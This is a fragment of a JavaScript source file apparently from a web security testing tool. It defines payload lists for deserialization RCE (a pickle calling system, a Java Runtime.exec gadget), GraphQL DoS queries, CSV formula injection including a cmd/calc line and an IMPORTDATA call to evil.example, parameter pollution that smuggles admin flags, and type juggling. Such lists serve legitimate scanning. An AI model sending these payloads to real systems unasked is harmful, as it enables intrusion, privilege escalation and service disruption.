...
const DESERIALIZATION = [
  ...
  'cos\nsystem\n(S\x27id\x27\ntR.',
  'AAEAAAD/////',                                        // .NET BinaryFormatter base64 magic
  'gASV',                                                // Python pickle protocol 4 base64
  '{"rce":["java.lang.Runtime","getRuntime","exec","id"]}',
  'O:4:"Evil":1:{s:3:"cmd";s:2:"id";}',                  // PHP object
];
...
// GraphQL abuse beyond introspection: depth/alias/field-duplication DoS, query
// batching, mutation discovery, and field-suggestion enumeration.
const GRAPHQL_INJECTION = [
  '{__typename}',
  'query{__type(name:"Query"){fields{name}}}',
  'query{__schema{mutationType{fields{name args{name type{name}}}}}}',
  // Alias-based amplification (response inflation / DoS).
  'query{a:__typename b:__typename c:__typename d:__typename e:__typename}',
  // Deeply nested self-referential query (cost/DoS) — adjust field names to target.
  'query{user{friends{friends{friends{friends{friends{id}}}}}}}',
  // Field duplication amplification.
  'query{user{id id id id id id id id id id}}',
  // Batched queries in one request (rate-limit / cost bypass).
  '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]',
  // Mutation probing.
  'mutation{__typename}',
  // Field suggestion / typo oracle (leaks valid field names in errors).
  'query{usr}',
  'query{user{passwrd}}',
  // Directive abuse.
  'query{__typename @skip(if:false)}',
  'query @deprecated {__typename}',
  // CSRF-via-GET surface (GraphQL over GET with query param).
  '?query={__typename}',
  // Introspection toggle probe.
  'query IntrospectionQuery{__schema{types{name}}}',
];

// CSV / formula injection for endpoints that export user input to spreadsheets.
const CSV_INJECTION = [
  '=1+1',
  '=1+1+cmd|\'/c calc\'!A1',
  '@SUM(1+1)',
  ...
  '=IMPORTDATA("http://evil.example/x")',
  '\t=1+1',
  '\r=1+1',
  '=2+5|cmd',
  '"=1+1"',
...
// HTTP parameter pollution: values that smuggle extra params or exploit
// first/last-wins and array-parsing differences between front and back ends.
const PARAM_POLLUTION = [
  '1&role=admin',
  '1&id=2',
  '1&admin=true',
  'normal&isAdmin=1',
...
// Type juggling / JSON shape confusion: feed unexpected types where a scalar is
// expected to bypass validation, auth comparisons, or trigger 500s.
const TYPE_JUGGLING = [
  'true',
  'false',
  'null',
...
const SETS = {
  ...
  'graphql-injection': { label: 'GraphQL Injection / DoS', category: 'API & modern', payloads: GRAPHQL_INJECTION },
  ...
  'csv-injection': { label: 'CSV / Formula Injection', category: 'Injection', payloads: CSV_INJECTION },
  'param-pollution': { label: 'HTTP Parameter Pollution', category: 'Access & auth', payloads: PARAM_POLLUTION },
  'type-juggling': { label: 'Type Juggling / JSON Shape', category: 'Wordlists & fuzz', payloads: TYPE_JUGGLING },
